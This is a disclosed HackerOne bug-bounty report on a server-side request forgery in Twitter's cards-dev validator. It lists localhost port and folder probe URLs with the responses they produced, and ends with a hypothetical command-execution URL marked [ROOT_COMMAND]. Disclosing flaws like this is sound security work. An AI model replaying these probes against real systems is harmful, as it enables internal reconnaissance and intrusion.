# SSRF in https://cards-dev.twitter.com/validator

## Report Details
- **Report ID**: 178184
- **URL**: https://hackerone.com/reports/178184
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-10-26T09:48:57.900Z
- **Disclosed**: 2017-04-06T09:03:52.611Z

## Reporter
- **Username**: mindaugas
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
Hello, 

After my previous report (2 years ago)  https://hackerone.com/reports/30860 you fixed the vulnerability, but now it looks like this fix was reverted and the same problem exists again.

Test scenario:
Open https://cards-dev.twitter.com/validator

1. Closed port on localhost
http://0.0.0.0:123 -> ERROR: Fetching the page failed because other errors.

2. Open port but not HTPP
http://0.0.0.0:22 -> ERROR: Failed to fetch page due to: ChannelClosed

3. Open HTPP port
http://0.0.0.0:4680
->
INFO:  Page fetched successfully
INFO:  2 metatags were found
WARN:  Not whitelisted

4. Existing folder
http://0.0.0.0:4680/system/
 ->
INFO:  Page fetched successfully
INFO:  2 metatags were found
WARN:  Not whitelisted

5. None existis folder
http://0.0.0.0:4680/system/
->
http://0.0.0.0:4680/test/
INFO:  Page fetched successfully
WARN:  No metatags found

Disaster scenario:
Find open HTTP service running on local infrastructure with ability to execute commands.

For example:
http://0.0.0.0:4680/system/command.php?command=[ROOT_COMMAND]



## Attachments
- twitter.png
